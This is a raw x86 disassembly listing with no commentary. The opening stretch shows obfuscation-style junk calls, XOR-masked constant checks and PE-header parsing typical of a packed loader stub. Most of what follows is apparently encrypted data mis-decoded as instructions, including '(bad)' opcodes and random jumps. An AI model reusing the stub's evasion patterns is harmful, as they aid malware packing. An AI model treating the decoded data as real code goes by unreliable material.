  4028aa:	push   DWORD PTR [ebp-0x24]
  4028ad:	push   0x43f7
  4028b2:	push   0x38dd
  4028b7:	push   DWORD PTR [ebp-0x10]
  4028ba:	push   0x3246
  4028bf:	push   0x510b
  4028c4:	push   0x8cd7
  4028c9:	push   DWORD PTR [ebp-0xc]
  4028cc:	push   0x63f7
  4028d1:	push   DWORD PTR [ebp-0x10]
  4028d4:	call   DWORD PTR ds:0x42e8bb
  4028da:	cmp    DWORD PTR ds:0x42d000,0x6
  4028e1:	jne    0x4028f4
  4028e7:	mov    ecx,DWORD PTR ds:0x42d000
  4028ed:	dec    ecx
  4028ee:	mov    DWORD PTR ds:0x42d000,ecx
  4028f4:	mov    ecx,DWORD PTR ds:0x42d000
  4028fa:	dec    ecx
  4028fb:	mov    DWORD PTR ds:0x42d000,ecx
  402901:	jmp    0x402880
  402906:	mov    ecx,0x751089b
  40290b:	xor    eax,ecx
  40290d:	cmp    eax,0xf89c85f0
  402912:	jne    0x402941
  402918:	mov    eax,DWORD PTR [ebp+0x8]
  40291b:	push   esi
  40291c:	mov    esi,DWORD PTR [ebp+0x8]
  40291f:	add    esi,DWORD PTR [eax+0x3c]
  402922:	mov    DWORD PTR [ebp+0x8],esi
  402925:	mov    eax,DWORD PTR [ebp-0x4]
  402928:	mov    esi,DWORD PTR [ebp+0x8]
  40292b:	xor    eax,ecx
  40292d:	add    eax,edx
  40292f:	cmp    DWORD PTR [esi+0x54],eax
  402932:	pop    esi
  402933:	je     0x402941
  402939:	mov    eax,DWORD PTR [ebp+0x8]
  40293c:	jmp    0x402948
  402941:	mov    eax,DWORD PTR [ebp-0x4]
  402944:	xor    eax,ecx
  402946:	add    eax,edx
  402948:	leave  
  402949:	ret    0x4
  40294c:	push   ebp
  40294d:	mov    ebp,esp
  40294f:	sub    esp,0x38
  402952:	xor    eax,eax
  402954:	xor    eax,DWORD PTR ds:0x42c00c
  40295a:	xor    DWORD PTR ds:0x42d010,eax
  402960:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  402967:	and    DWORD PTR ds:0x429020,0x0
  402971:	jmp    0x402981
  402976:	mov    eax,ds:0x429020
  40297b:	inc    eax
  40297c:	mov    ds:0x429020,eax
  402981:	cmp    DWORD PTR ds:0x429020,0x12
  402988:	jae    0x4029d7
  40298e:	cmp    DWORD PTR ds:0x429020,0x4
  402995:	jne    0x4029b5
  40299b:	push   0x3575
  4029a0:	push   0x2056
  4029a5:	push   0x7cad
  4029aa:	push   0x3741
  4029af:	call   DWORD PTR ds:0x42e8e7
  4029b5:	cmp    DWORD PTR ds:0x429020,0x3
  4029bc:	jne    0x4029d0
  4029c2:	xor    eax,eax
  4029c4:	add    eax,DWORD PTR ds:0x429020
  4029ca:	inc    eax
  4029cb:	mov    ds:0x429020,eax
  4029d0:	jmp    0x402976
  4029d5:	not    eax
  4029d7:	push   ebx
  4029d8:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4029df:	mov    eax,DWORD PTR [ebp-0x4]
  4029e2:	add    DWORD PTR ds:0x42900c,0x42a018
  4029ec:	push   esi
  4029ed:	mov    esi,0x751089b
  4029f2:	xor    DWORD PTR ds:0x429018,0x429014
  4029fc:	xor    eax,esi
  4029fe:	sbb    DWORD PTR ds:0x42b000,0x77b
  402a08:	push   edi
  402a09:	mov    DWORD PTR ds:0x429018,0x1e
  402a13:	cmp    DWORD PTR ds:0x429018,0x0
  402a1a:	je     0x402a6e
  402a20:	cmp    DWORD PTR ds:0x429018,0xe
  402a27:	jne    0x402a42
  402a2d:	push   0x6dbc
  402a32:	push   0x42a004
  402a37:	push   0x657a
  402a3c:	call   DWORD PTR ds:0x42e8bf
  402a42:	cmp    DWORD PTR ds:0x429018,0xf
  402a49:	jne    0x402a5c
  402a4f:	mov    edi,DWORD PTR ds:0x429018
  402a55:	dec    edi
  402a56:	mov    DWORD PTR ds:0x429018,edi
  402a5c:	mov    edi,DWORD PTR ds:0x429018
  402a62:	dec    edi
  402a63:	mov    DWORD PTR ds:0x429018,edi
  402a69:	jmp    0x402a13
  402a6e:	mov    edi,0x3272e2
  402a73:	or     DWORD PTR ds:0x42a014,0x429014
  402a7d:	add    eax,edi
  402a7f:	adc    DWORD PTR ds:0x429008,0x42a018
  402a89:	mov    DWORD PTR [ebp-0x1c],eax
  402a8c:	movzx  eax,BYTE PTR ds:0x429010
  402a93:	xor    eax,DWORD PTR ds:0x42b00c
  402a99:	mov    ds:0x429010,eax
  402a9e:	mov    eax,DWORD PTR [ebp+0x14]
  402aa1:	test   eax,eax
  402aa3:	jmp    0x404df8
  402aa8:	retf   
  402aa9:	int    0x38
  402aab:	outs   dx,DWORD PTR ds:[esi]
  402aac:	cmp    cl,BYTE PTR [ebx-0x3abb3675]
  402ab2:	jae    0x402a43
  402ab4:	jge    0x402b1f
  402ab6:	or     al,0xba
  402ab8:	jl     0x402b36
  402aba:	jl     0x402b38
  402abc:	xor    al,0x5f
  402abe:	jl     0x402b3c
  402ac0:	adc    eax,0x1139172e
  402ac5:	and    eax,0x32652f13
  402aca:	popa   
  402acb:	pusha  
  402acc:	aas    
  402acd:	fs ins BYTE PTR es:[edi],dx
  402acf:	ins    BYTE PTR es:[edi],dx
  402ad0:	ins    DWORD PTR es:[edi],dx
  402ad1:	xor    al,0xc5
  402ad3:	fdivp  st(1),st
  402ad5:	push   0x42
  402ad7:	arpl   WORD PTR [ecx+0x53],di
  402ada:	stos   BYTE PTR es:[edi],al
  402adb:	jp     0x402b4a
  402add:	push   ecx
  402ade:	iret   
  402adf:	pop    ebp
  402ae0:	dec    esp
  402ae1:	cmp    cl,BYTE PTR [esi+0x577087fc]
  402ae7:	dec    ebp
  402ae8:	jg     0x402b21
  402aea:	mov    ah,BYTE PTR [eax+0x33a4ba7f]
  402af0:	jmp    DWORD PTR cs:[eax-0x22]
  402af4:	cld    
  402af5:	imul   edi,DWORD PTR [edi+0x18],0xffffffed
  402af9:	xor    ebp,ecx
  402afb:	mov    esp,0xd82b87ed
  402b00:	and    DWORD PTR [ecx],0xf
  402b03:	push   ecx
  402b04:	mov    ds:0x6df7c68c,eax
  402b09:	fld    QWORD PTR [esi]
  402b0b:	(bad)  
  402b0c:	or     ah,bh
  402b0e:	and    BYTE PTR [edx],dl
  402b10:	inc    edx
  402b11:	push   cs
  402b12:	and    BYTE PTR [ebx+0x62],ah
  402b15:	mov    cl,0xaf
  402b17:	sub    ebx,DWORD PTR [ecx+0x5]
  402b1a:	mov    al,ds:0x2341e1ff
  402b1f:	jbe    0x402b55
  402b21:	ret    0xf153
  402b24:	sbb    al,0xfc
  402b26:	jb     0x402ae1
  402b28:	jnp    0x402b07
  402b2a:	xchg   edx,eax
  402b2b:	pop    edi
  402b2c:	cmp    DWORD PTR [ecx+0x49841607],0xb
  402b33:	cwde   
  402b34:	ds je  0x402ac2
  402b37:	add    ebx,esp
  402b39:	sub    eax,0x4b368d54
  402b3e:	push   esi
  402b3f:	sti    
  402b40:	iret   
  402b41:	mov    WORD PTR [ecx],fs
  402b43:	or     edx,0x6982ceb7
  402b49:	out    0x45,al
  402b4b:	push   esp
  402b4c:	dec    esi
  402b4d:	push   cs
  402b4e:	cmp    BYTE PTR [ebx],cl
  402b50:	xor    BYTE PTR [ebx],bl
  402b52:	lods   eax,DWORD PTR ds:[esi]
  402b53:	inc    ebx
  402b54:	int3   
  402b55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b56:	dec    edx
  402b57:	fiadd  DWORD PTR [esi]
  402b59:	push   eax
  402b5a:	std    
  402b5b:	push   esp
  402b5c:	push   eax
  402b5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b5e:	icebp  
  402b5f:	bound  edi,QWORD PTR [edi-0x79e2bb0e]
  402b65:	add    al,0xbb
  402b67:	mov    edx,0x41beab15
  402b6c:	sbb    BYTE PTR [ecx+0x5504be41],0x60
  402b73:	pop    ecx
  402b74:	push   esi
  402b75:	inc    ecx
  402b76:	add    esp,edi
  402b78:	mul    DWORD PTR [ebx-0x42]
  402b7b:	sbb    DWORD PTR [eax],ecx
  402b7d:	mov    edx,0x13abac4d
  402b82:	shr    DWORD PTR [esi-0x5d],cl
  402b85:	cmp    BYTE PTR [edi],ah
  402b87:	mov    ds:0xbe0da566,eax
  402b8c:	xor    BYTE PTR [esi],0xec
  402b8f:	dec    ebp
  402b90:	lahf   
  402b91:	xor    eax,0x3a1d1cdd
  402b96:	ins    BYTE PTR es:[edi],dx
  402b97:	jb     0x402b72
  402b99:	xor    al,0xd6
  402b9b:	std    
  402b9c:	adc    eax,0x737f5b20
  402ba1:	leave  
  402ba2:	pop    esp
  402ba3:	stos   BYTE PTR es:[edi],al
  402ba4:	mov    bl,0x79
  402ba6:	push   cs
  402ba7:	xchg   ecx,eax
  402ba8:	je     0x402b87
  402baa:	int3   
  402bab:	test   BYTE PTR [edi],0x3c
  402bae:	outs   dx,BYTE PTR ds:[esi]
  402baf:	xchg   ebx,eax
  402bb0:	sub    eax,0xd79a8349
  402bb5:	jmp    esi
  402bb7:	dec    ebp
  402bb8:	inc    esp
  402bb9:	arpl   WORD PTR [ebx],sp
  402bbb:	cld    
  402bbc:	(bad)  
  402bbd:	dec    ebp
  402bbe:	arpl   WORD PTR [edi+0x5e],dx
  402bc1:	xor    BYTE PTR [bp+di-0x2808],ch
  402bc6:	adc    dl,dl
  402bc8:	cmp    DWORD PTR [eax-0x74799ab4],ebp
  402bce:	lock fs int3 
  402bd1:	jg     0x402b77
  402bd3:	out    0xab,al
  402bd5:	fldcw  WORD PTR [edi]
  402bd7:	xor    dh,BYTE PTR [eax+edi*1+0x30335889]
  402bde:	imul   edx,esp,0x12
  402be1:	sub    al,0xd
  402be3:	xchg   ebp,eax
  402be4:	xchg   esi,eax
  402be5:	ja     0x402b7d
  402be7:	mov    DWORD PTR [ecx+0x2a],ecx
  402bea:	jge    0x402b77
  402bec:	pop    ss
  402bed:	inc    ebx
  402bee:	or     al,0x1b
  402bf0:	stc    
  402bf1:	out    dx,eax
  402bf2:	aam    0xd6
  402bf4:	stos   DWORD PTR es:[edi],eax
  402bf5:	inc    ebp
  402bf6:	pop    ebp
  402bf7:	add    eax,0x5514a914
  402bfc:	outs   dx,BYTE PTR ds:[esi]
  402bfd:	sbb    ecx,DWORD PTR [ecx+0x44120ac]
  402c03:	cmp    eax,edi
  402c05:	popf   
  402c06:	mov    cl,0x1e
  402c08:	mov    al,0x77
  402c0a:	dec    eax
  402c0b:	fs sub eax,ebx
  402c0e:	jne    0x402c39
  402c10:	and    eax,0xa47c8f61
  402c15:	(bad)  
  402c16:	aaa    
  402c17:	pop    esi
  402c18:	popa   
  402c19:	pop    ecx
  402c1a:	xchg   BYTE PTR [edi],ch
  402c1c:	ss in  al,0x7d
  402c1f:	sub    DWORD PTR [ebx-0x26],ebx
  402c22:	jmp    DWORD PTR [eax+0x33]
  402c25:	push   ss
  402c26:	mov    WORD PTR [eax+0x6e],?
  402c29:	jmp    0x1897367b
  402c2e:	sbb    eax,0x424f7d17
  402c33:	xor    ebp,DWORD PTR [edi-0x2a]
  402c36:	ffree  st(0)
  402c38:	popf   
  402c39:	cmp    BYTE PTR [esp+edx*2-0x16a84e2],bh
  402c40:	not    BYTE PTR [ebp+0x48]
  402c43:	iret   
  402c44:	js     0x402bf4
  402c46:	sbb    DWORD PTR [esp+eax*1-0x1b921ea5],edx
  402c4d:	or     bl,bl
  402c4f:	pop    esp
  402c50:	pusha  
  402c51:	idiv   DWORD PTR [edx-0x45b16bc8]
  402c57:	mov    ebp,0x4bf678cd
  402c5c:	fidiv  DWORD PTR [ebp+0x217e316c]
  402c62:	aam    0x39
  402c64:	jnp    0x402c7d
  402c66:	aad    0xfd
  402c68:	sbb    eax,0x55f46897
  402c6d:	push   esi
  402c6e:	inc    edi
  402c6f:	push   esp
  402c70:	daa    
  402c71:	fld    DWORD PTR [eax-0x5a]
  402c74:	xchg   esp,eax
  402c75:	iret   
  402c76:	and    eax,0xba6fa3a9
  402c7b:	jae    0x402c5c
  402c7d:	lea    ebx,[bp+si-0x6288]
  402c82:	int    0x78
  402c84:	dec    edi
  402c85:	push   ebp
  402c86:	pop    ds
  402c87:	push   0x3
  402c89:	xor    ch,al
  402c8b:	in     eax,0x9e
  402c8d:	cdq    
  402c8e:	and    ecx,DWORD PTR [ecx-0xd]
  402c91:	sbb    al,0x8f
  402c93:	inc    edi
  402c94:	jo     0x402cf9
  402c96:	mov    al,0xe4
  402c98:	dec    ebx
  402c99:	icebp  
  402c9a:	call   0x5bb47de
  402c9f:	push   ecx
  402ca0:	hlt    
  402ca1:	test   ch,dh
  402ca3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ca4:	or     DWORD PTR [ebp-0x43f3bda8],eax
  402caa:	shl    BYTE PTR [ecx+0x66],0x5b
  402cae:	std    
  402caf:	dec    esp
  402cb0:	es add eax,0xbee7bcf7
  402cb6:	call   0xff83:0x7951531b
  402cbd:	fwait
  402cbe:	cwde   
  402cbf:	mov    ebp,0xae37f24d
  402cc4:	cmp    eax,DWORD PTR [ebp+0x54bf24c0]
  402cca:	daa    
  402ccb:	mov    ds:0xa18016d4,eax
  402cd0:	test   BYTE PTR [edx],0x22
  402cd3:	icebp  
  402cd4:	push   edx
  402cd5:	aas    
  402cd6:	jecxz  0x402cfe
  402cd8:	out    dx,eax
  402cd9:	out    dx,al
  402cda:	xchg   BYTE PTR fs:[ebx-0x181bd6e5],bl
  402ce1:	in     eax,dx
  402ce2:	xchg   esp,eax
  402ce3:	jns    0x402d4f
  402ce5:	cs mov ebp,0x64e464cb
  402ceb:	xor    al,0xf7
  402ced:	mov    dl,0x75
  402cef:	leave  
  402cf0:	push   es
  402cf1:	lea    edx,[edx+0x36]
  402cf4:	and    DWORD PTR [ecx-0x289e5b0a],ecx
  402cfa:	mov    edi,DWORD PTR [eax]
  402cfc:	xlat   BYTE PTR ds:[ebx]
  402cfd:	xchg   edi,eax
  402cfe:	jp     0x402cd0
  402d00:	xor    al,0x97
  402d02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d03:	leave  
  402d04:	mov    ebp,0x3b364f72
  402d09:	outs   dx,BYTE PTR ds:[esi]
  402d0a:	pop    edx
  402d0b:	nop
  402d0c:	mov    dh,0xc3
  402d0e:	outs   dx,DWORD PTR ds:[esi]
  402d0f:	mov    cl,0xe3
  402d11:	in     al,dx
  402d12:	(bad)  
  402d13:	lds    eax,FWORD PTR [ebp-0x7c]
  402d16:	mov    ebx,DWORD PTR [edi-0x26]
  402d19:	addr16 jae 0x402d00
  402d1c:	adc    DWORD PTR [ebx+0x302b2cc9],0xc5849b72
  402d26:	dec    esp
  402d27:	xchg   edx,eax
  402d28:	ret    0xc0ee
  402d2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d2c:	add    bl,BYTE PTR [edx+0x646df8a9]
  402d32:	xchg   ebp,eax
  402d33:	dec    esp
  402d34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d35:	pop    esi
  402d36:	cli    
  402d37:	mov    WORD PTR [eax],es
  402d39:	call   0xb7cba6e
  402d3e:	mov    ecx,0xf1d18fdb
  402d43:	or     ecx,ebp
  402d45:	xchg   ebx,eax
  402d46:	jb     0x402d3f
  402d48:	pop    ds
  402d49:	test   BYTE PTR [esi],al
  402d4b:	mov    al,ds:0xe20dacf8
  402d50:	and    al,0xd5
  402d52:	(bad)  
  402d53:	mov    ebx,0xa9ed16db
  402d58:	inc    DWORD PTR [edx]
  402d5a:	pop    ds
  402d5b:	xor    BYTE PTR [esi+0x60],0x4f
  402d5f:	cmp    ecx,ebx
  402d61:	jl     0x402d98
  402d63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d64:	sub    cl,ch
  402d66:	mov    bl,0xcf
  402d68:	cwde   
  402d69:	(bad)  
  402d6a:	or     cl,BYTE PTR [ebx]
  402d6c:	enter  0x9752,0x9e
  402d70:	add    eax,eax
  402d72:	ins    DWORD PTR es:[edi],dx
  402d73:	outs   dx,DWORD PTR ds:[esi]
  402d74:	stos   DWORD PTR es:[edi],eax
  402d75:	imul   BYTE PTR [ebx+0x128d6ce]
  402d7b:	aad    0x24
  402d7d:	test   eax,0xd91598a5
  402d82:	sub    ch,BYTE PTR [eax]
  402d84:	test   BYTE PTR [edx],bh
  402d86:	jne    0x402daa
  402d88:	mov    WORD PTR [ecx+0x2d],gs
  402d8b:	sub    al,0xfc
  402d8d:	mov    edx,eax
  402d8f:	jo     0x402d67
  402d91:	xchg   edi,eax
  402d92:	add    BYTE PTR [ecx],dh
  402d94:	push   esp
  402d95:	and    al,0x3e
  402d97:	sub    BYTE PTR [ebx-0x3b],0xd
  402d9b:	mov    esp,0xdc6cebb6
  402da0:	cmc    
  402da1:	pop    ds
  402da2:	xor    eax,0xd20d964c
  402da7:	xchg   ebx,eax
  402da8:	ja     0x402d50
  402daa:	or     edx,DWORD PTR [edx-0x79f2a39b]
  402db0:	cmp    DWORD PTR [eax-0x54d479c5],ecx
  402db6:	jns    0x402d72
  402db8:	ja     0x402d51
  402dba:	cmc    
  402dbb:	aam    0xfa
  402dbd:	div    BYTE PTR [ecx+0x78fbc216]
  402dc3:	mov    ebp,0xe498d348
  402dc8:	fild   QWORD PTR [eax-0x133c58e4]
  402dce:	inc    ebx
  402dcf:	jge    0x402daf
  402dd1:	jecxz  0x402dff
  402dd3:	test   DWORD PTR [edi],esp
  402dd5:	ja     0x402d68
  402dd7:	push   esi
  402dd8:	test   DWORD PTR [ebp-0x7a],ecx
  402ddb:	xchg   BYTE PTR [ebx-0x7d],ch
  402dde:	push   ebp
  402ddf:	bound  ebp,QWORD PTR [esi+0x55]
  402de2:	sub    edx,DWORD PTR [ebx-0x6d]
  402de5:	jb     0x402de3
  402de7:	sahf   
  402de8:	arpl   sp,bx
  402dea:	push   edx
  402deb:	sub    eax,0x27f5b44b
  402df0:	mul    DWORD PTR [esi-0x17]
  402df3:	mov    ?,WORD PTR [edx]
  402df5:	xor    al,0xcf
  402df7:	sbb    edx,DWORD PTR [ebp+0x7b]
  402dfa:	cld    
  402dfb:	pop    es
  402dfc:	or     al,0xbf
  402dfe:	shr    BYTE PTR [edx*4+0x6cb89202],cl
  402e05:	rcl    DWORD PTR [edi+0x47e6293b],0xcc
  402e0c:	mov    bh,0x3e
  402e0e:	and    ebx,DWORD PTR [ecx]
  402e10:	jb     0x402dca
  402e12:	mov    esp,0xca89650c
  402e17:	aaa    
  402e18:	shl    BYTE PTR [ebx+ebx*1-0x5ec53358],1
  402e1f:	and    DWORD PTR [esi-0x7171e382],edx
  402e25:	dec    ebx
  402e26:	inc    ebx
  402e27:	je     0x402e36
  402e29:	push   edx
  402e2a:	out    dx,al
  402e2b:	imul   BYTE PTR [eax-0x1996988a]
  402e31:	xchg   edi,eax
  402e32:	push   esp
  402e33:	jge    0x402e77
  402e35:	add    al,0xc5
  402e37:	rcl    DWORD PTR [eax-0x7e],1
  402e3a:	mov    bl,0x9d
  402e3c:	loope  0x402e93
  402e3e:	in     al,0x9f
  402e40:	xchg   ebx,eax
  402e41:	pop    edx
  402e42:	jg     0x402e83
  402e44:	or     BYTE PTR [ebx],0x9f
  402e47:	sub    dl,bh
  402e49:	imul   esp,esp,0xffffffe4
  402e4c:	xchg   esp,eax
  402e4d:	or     ebp,DWORD PTR [edi-0x6905e3ab]
  402e53:	fdivp  st(4),st
  402e55:	stos   DWORD PTR es:[edi],eax
  402e56:	stos   BYTE PTR es:[edi],al
  402e57:	inc    esi
  402e58:	scas   al,BYTE PTR es:[edi]
  402e59:	add    al,0x5
  402e5b:	pmulhuw mm5,QWORD PTR [eax]
  402e5e:	jle    0x402de6
  402e60:	mov    ch,0xbd
  402e62:	fcmovnb st,st(7)
  402e64:	popa   
  402e65:	xor    al,0xf0
  402e67:	mov    BYTE PTR [ecx],al
  402e69:	not    ebx
  402e6b:	fcmovnu st,st(3)
  402e6d:	xchg   esi,eax
  402e6e:	xchg   edx,eax
  402e6f:	mov    eax,ds:0xd7df0ad3
  402e74:	xchg   esp,eax
  402e75:	dec    eax
  402e76:	cmp    eax,0xbe4bf9ac
  402e7b:	dec    esi
  402e7c:	nop
  402e7d:	xlat   BYTE PTR ds:[ebx]
  402e7e:	das    
  402e7f:	std    
  402e80:	sahf   
  402e81:	out    0xa9,eax
  402e83:	inc    edx
  402e84:	loopne 0x402e2b
  402e86:	fcmovnb st,st(7)
  402e88:	adc    dl,BYTE PTR [ebx-0x15]
  402e8b:	sub    bh,ch
  402e8d:	scas   eax,DWORD PTR es:[edi]
  402e8e:	add    eax,ecx
  402e90:	stc    
  402e91:	mov    edi,esp
  402e93:	aad    0x96
  402e95:	add    eax,0x93225148
  402e9a:	adc    dh,BYTE PTR ds:0x39ec88bc
  402ea0:	je     0x402f19
  402ea2:	call   0x546863a1
  402ea7:	enter  0x154,0x6
  402eab:	adc    bh,bl
  402ead:	mov    ecx,0x659693ff
  402eb2:	add    ebp,DWORD PTR [edi+edx*8+0x3493e241]
  402eb9:	sub    DWORD PTR [eax-0x541f2cdb],edi
  402ebf:	or     BYTE PTR cs:[edx],ch
  402ec2:	xor    al,0xbe
  402ec4:	rdpmc  
  402ec6:	and    dh,BYTE PTR [eax]
  402ec8:	mov    ah,0xb5
  402eca:	cmc    
  402ecb:	jmp    0x49280e21
  402ed0:	jnp    0x402e89
  402ed2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ed3:	shr    BYTE PTR [ebp+0x28ef8f16],1
  402ed9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402eda:	scas   al,BYTE PTR es:[edi]
  402edb:	jbe    0x402ee6
  402edd:	lea    ecx,[ebp+0x5c]
  402ee0:	add    eax,0x511363b4
  402ee5:	nop
  402ee6:	mov    ds:0x359e6273,al
  402eeb:	or     eax,0x36645e47
  402ef0:	push   edi
  402ef1:	mov    ah,0x45
  402ef3:	lock repz mov ecx,0x5eb24d67
  402efa:	inc    esi
  402efb:	pop    esp
  402efc:	and    BYTE PTR [ebx],bl
  402efe:	pop    ebx
  402eff:	or     al,0x9c
  402f01:	pop    ecx
  402f02:	add    DWORD PTR [eax-0x570353fe],0x0
  402f09:	jp     0x402f37
  402f0b:	jns    0x402eb4
  402f0d:	loope  0x402ebd
  402f0f:	mov    ch,0xea
  402f11:	je     0x402f51
  402f13:	pop    ebx
  402f14:	cmc    
  402f15:	cmp    eax,0x788fd84
  402f1a:	lds    esi,FWORD PTR [ebx-0x50]
  402f1d:	pop    ebx
  402f1e:	add    eax,0x6ca77a4f
  402f23:	mov    gs:0x2fe74ca7,al
  402f29:	xchg   cl,dh
  402f2b:	popa   
  402f2c:	add    BYTE PTR [edi+ebp*1],bh
  402f2f:	daa    
  402f30:	data16 xlat BYTE PTR ds:[ebx]
  402f32:	or     edx,DWORD PTR [ebp+0x23]
  402f35:	out    dx,al
  402f36:	ja     0x402ef5
  402f38:	mov    ebx,0x15817e2b
  402f3d:	mov    bh,0x3f
  402f3f:	dec    edx
  402f40:	call   0x8ec77508
  402f45:	dec    edx
  402f46:	test   ebx,esi
  402f48:	jne    0x402f92
  402f4a:	cld    
  402f4b:	js     0x402f64
  402f4d:	jo     0x402f45
  402f4f:	js     0x402f2f
  402f51:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f53:	cmp    DWORD PTR [esi+ecx*8+0x26],eax
  402f57:	in     eax,0x99
  402f59:	lods   eax,DWORD PTR ds:[esi]
  402f5a:	addr16 xchg esi,eax
  402f5c:	sub    BYTE PTR [ecx],bh
  402f5e:	dec    ebx
  402f5f:	sbb    bl,al
  402f61:	sub    ah,BYTE PTR ds:0x7f8b2e2f
  402f67:	adc    BYTE PTR [edi-0x77e43248],ch
  402f6d:	or     DWORD PTR ds:0xd474da5d,ecx
  402f73:	dec    ebx
  402f74:	outs   dx,BYTE PTR ds:[esi]
  402f75:	xchg   esi,eax
  402f76:	jbe    0x402f5a
  402f78:	push   ebx
  402f79:	xlat   BYTE PTR ds:[ebx]
  402f7a:	stos   BYTE PTR es:[edi],al
  402f7b:	cld    
  402f7c:	nop
  402f7d:	push   ecx
  402f7e:	test   al,0xaa
  402f80:	cmp    bl,BYTE PTR [ebp-0x5f]
  402f83:	adc    ecx,DWORD PTR [esi+0xa279810]
  402f89:	daa    
  402f8a:	mov    bl,0xc0
  402f8c:	and    DWORD PTR [edi+0x3d80b812],esi
  402f92:	xchg   edi,eax
  402f93:	test   eax,0xe4df29af
  402f98:	out    0x55,eax
  402f9a:	jle    0x402ff1
  402f9c:	mov    ch,0xb8
  402f9e:	mov    WORD PTR [eax-0x4e303af],fs
  402fa4:	jl     0x402fd3
  402fa6:	aad    0xa1
  402fa8:	dec    ecx
  402fa9:	addr16 dec ebx
  402fab:	jnp    0x402f90
  402fad:	out    dx,eax
  402fae:	add    BYTE PTR [ebx+esi*8],ah
  402fb1:	stos   DWORD PTR es:[edi],eax
  402fb2:	push   esp
  402fb3:	ins    BYTE PTR es:[edi],dx
  402fb4:	dec    ebx
  402fb5:	sbb    ebp,eax
  402fb7:	xchg   esp,eax
  402fb8:	push   edx
  402fb9:	pop    esi
  402fba:	dec    BYTE PTR [edi+eiz*1+0x74a6f0b7]
  402fc1:	ret    0x6d90
  402fc4:	(bad)  
  402fc5:	data16 fsubp st(2),st
  402fc8:	add    dl,BYTE PTR [edi+esi*2+0x528ad321]
  402fcf:	push   ebp
  402fd0:	stc    
  402fd1:	test   DWORD PTR [edx-0x5f61833b],0x5cf165a4
  402fdb:	cmp    al,0x60
  402fdd:	sbb    al,0xde
  402fdf:	daa    
  402fe0:	dec    ebp
  402fe1:	stos   BYTE PTR es:[edi],al
  402fe2:	jmp    0xaf21adf8
  402fe7:	scas   al,BYTE PTR es:[edi]
  402fe8:	jle    0x403065
  402fea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402feb:	dec    eax
  402fec:	jns    0x403021
  402fee:	sti    
  402fef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ff0:	mov    ebp,0x89ff3f95
  402ff5:	or     eax,0xd424818a
  402ffa:	mov    ecx,0xe1c037f0
  402fff:	jmp    0x402f8f
  403001:	shr    BYTE PTR [edi+0x48dde441],0xdb
  403008:	mov    ds:0x5e6c8ff8,al
  40300d:	push   ebp
  40300e:	push   ecx
  40300f:	jmp    0x9adef07b
  403014:	mov    esi,0xbbdf6420
  403019:	xchg   ecx,eax
  40301a:	loopne 0x402fb6
  40301c:	jne    0x403049
  40301e:	cdq    
  40301f:	adc    BYTE PTR [ebp-0x11d62988],dh
  403025:	sub    ah,BYTE PTR [edx+0x6b54ffe]
  40302b:	jge    0x403054
  40302d:	xchg   edx,eax
  40302e:	bound  esi,QWORD PTR [esi+eax*4-0x45]
  403032:	jmp    DWORD PTR [ecx]
  403034:	stc    
  403035:	hlt    
  403036:	jno    0x403021
  403038:	mul    ch
  40303a:	xchg   esp,eax
  40303b:	hlt    
  40303c:	popa   
  40303d:	shl    BYTE PTR [ebp-0x2a7cca89],0xef
  403044:	cmp    eax,0xec514453
  403049:	mov    dh,ah
  40304b:	jno    0x403089
  40304d:	hlt    
  40304e:	pop    ss
  40304f:	xor    esp,DWORD PTR [ebp+0x32560ea9]
  403055:	mov    esp,0x14552d2d
  40305a:	adc    DWORD PTR [esi+esi*8+0x5f],esi
  40305e:	int3   
  40305f:	pop    esi
  403060:	div    ebx
  403062:	sub    DWORD PTR [ebp+0x60],0x84a4ecd5
  403069:	push   ds
  40306a:	cs xchg ebp,eax
  40306c:	pop    eax
  40306d:	and    esp,eax
  40306f:	jmp    0x40304c
  403071:	popf   
  403072:	sbb    ebx,ebx
  403074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403075:	push   esi
  403076:	sub    eax,DWORD PTR [ecx+0x5f5f659b]
  40307c:	mov    WORD PTR [esi],fs
  40307e:	loop   0x40301d
  403080:	retf   
  403081:	(bad)  
  403082:	int3   
  403083:	adc    esi,ecx
  403085:	xchg   ebp,eax
  403086:	mov    ds:0x1f6f5fc3,eax
  40308b:	out    0xc0,eax
  40308d:	popa   
  40308e:	xchg   ecx,eax
  40308f:	jecxz  0x403059
  403091:	mov    edi,DWORD PTR [eax-0xc46d795]
  403097:	cmp    DWORD PTR [esi+0x368fcf4d],esp
  40309d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40309e:	jg     0x4030e7
  4030a0:	mov    fs,ebx
  4030a2:	outs   dx,BYTE PTR ds:[esi]
  4030a3:	call   0x5fa5:0x592a00f3
  4030aa:	hlt    
  4030ab:	jmp    0x4030f2
  4030ad:	fst    QWORD PTR [ecx-0x3ffcaa51]
  4030b3:	pusha  
  4030b4:	inc    edi
  4030b5:	adc    eax,0x833f541d
  4030ba:	mov    ch,0x5b
  4030bc:	inc    edi
  4030bd:	mov    dl,0x8b
  4030bf:	adc    eax,edi
  4030c1:	mov    dh,0x8c
  4030c3:	aas    
  4030c4:	aas    
  4030c5:	and    ebp,DWORD PTR [esi-0x7b46336c]
  4030cb:	ins    DWORD PTR es:[edi],dx
  4030cc:	and    eax,0x39ca3ac
  4030d1:	pop    ebx
  4030d2:	jmp    0xa18e:0xdb5dab0a
  4030d9:	dec    DWORD PTR [esi+0x7e]
  4030dc:	iret   
  4030dd:	jl     0x403113
  4030df:	inc    edx
  4030e0:	sub    BYTE PTR [esi+0x3],dl
  4030e3:	jge    0x403125
  4030e5:	push   eax
  4030e6:	int    0xaf
  4030e8:	sbb    bh,ah
  4030ea:	loopne 0x4030ef
  4030ec:	retf   0x76bc
  4030ef:	push   esp
